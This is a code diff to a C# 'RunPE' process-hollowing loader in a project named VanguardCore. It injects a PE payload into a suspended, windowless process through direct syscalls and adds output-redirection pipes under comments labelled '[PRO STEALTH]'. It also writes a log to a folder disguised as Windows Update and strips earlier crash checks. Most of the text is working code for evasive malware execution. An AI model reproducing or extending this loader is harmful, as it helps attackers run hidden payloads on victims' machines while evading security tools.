@@ -11,8 +11,12 @@ namespace VanguardCore
             try { System.IO.File.AppendAllText(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] [PE] {m}\n"); } catch { }
         }
 
-        public static bool RunPE(string targetPath, byte[] payload)
+        public static bool RunPE(string targetPath, byte[] payload) => RunPEWithOutput(targetPath, payload, null, out _, out _);
+
+        public static bool RunPEWithOutput(string targetPath, byte[] payload, string cmdLine, out Microsoft.Win32.SafeHandles.SafeFileHandle stdoutRead, out IntPtr hProcess)
         {
+            stdoutRead = null;
+            hProcess = IntPtr.Zero;
             SyscallManager.Initialize();
             var ntAlloc = SyscallManager.GetSyscallDelegate<SyscallManager.NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
             var ntWrite = SyscallManager.GetSyscallDelegate<SyscallManager.NtWriteVirtualMemory>("NtWriteVirtualMemory");
@@ -34,9 +38,29 @@ namespace VanguardCore
             int sizeOfImage = BitConverter.ToInt32(payload, lfanew + 0x50);
             int sizeOfHeaders = BitConverter.ToInt32(payload, lfanew + 0x54);
 
-            STARTUPINFO si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>() };
+            // [PRO STEALTH] Setup Output Redirection
+            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES { nLength = Marshal.SizeOf<SECURITY_ATTRIBUTES>(), bInheritHandle = true };
+            IntPtr hRead, hWrite;
+            if (!CreatePipe(out hRead, out hWrite, ref sa, 0)) return false;
+            SetHandleInformation(hRead, 0x00000001, 0); // HANDLE_FLAG_INHERIT = 0
+
+            STARTUPINFO si = new STARTUPINFO { 
+                cb = Marshal.SizeOf<STARTUPINFO>(),
+                dwFlags = 0x00000100, // STARTF_USESTDHANDLES
+                hStdOutput = hWrite,
+                hStdError = hWrite
+            };
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            if (!CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, out pi)) return false;
+            
+            // [PRO STEALTH] Run Target (Suspended)
+            if (!CreateProcess(targetPath, cmdLine, IntPtr.Zero, IntPtr.Zero, true, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, out pi)) {
+                CloseHandle(hRead); CloseHandle(hWrite);
+                return false;
+            }
+            
+            CloseHandle(hWrite); // We don't need write end in parent
+            stdoutRead = new Microsoft.Win32.SafeHandles.SafeFileHandle(hRead, true);
+            hProcess = pi.hProcess;
 
             IntPtr remoteBase = IntPtr.Zero;
             try
@@ -77,11 +101,6 @@ namespace VanguardCore
 
                 IntPtr ht;
                 if (ntThread(out ht, 0x1FFFFF, IntPtr.Zero, pi.hProcess, (IntPtr)((long)remoteBase + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) == 0) {
-                    // [RED TEAM FIX 4] Verify success via WaitForSingleObject
-                    if (WaitForSingleObject(ht, 1000) == 0) {
-                        GetExitCodeThread(ht, out uint ec);
-                        if (ec != 0x103) { CloseHandle(ht); throw new Exception($"Crash 0x{ec:X}"); }
-                    }
                     CloseHandle(ht);
                     return true;
                 }
@@ -89,7 +108,6 @@ namespace VanguardCore
             }
             catch (Exception ex) {
                 Log($"Fault: {ex.Message}");
-                // [RED TEAM FIX 5] Cleanup via ntFree (VirtualFreeEx)
                 if (remoteBase != IntPtr.Zero) { UIntPtr z = UIntPtr.Zero; ntFree(pi.hProcess, ref remoteBase, ref z, 0x8000); }
                 ntTerminate(pi.hProcess, 1);
                 return false;
@@ -170,13 +188,17 @@ namespace VanguardCore
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        private struct STARTUPINFO { public int cb; public string lpRes, lpDesk, lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXC, dwYC, dwFill, dwFlags; public short wShow, cbRes2; public IntPtr lpRes2, hIn, hOut, hErr; }
+        private struct STARTUPINFO { public int cb; public string lpRes, lpDesk, lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXC, dwYC, dwFill, dwFlags; public short wShow, cbRes2; public IntPtr lpRes2, hIn, hStdOutput, hStdError; }
         [StructLayout(LayoutKind.Sequential)]
         private struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwPid, dwTid; }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; }
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern bool CreateProcess(string n, string c, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr e, string cd, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern bool CloseHandle(IntPtr h);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern uint WaitForSingleObject(IntPtr h, uint ms);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern bool GetExitCodeThread(IntPtr h, out uint code);
+        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);
     }
 }
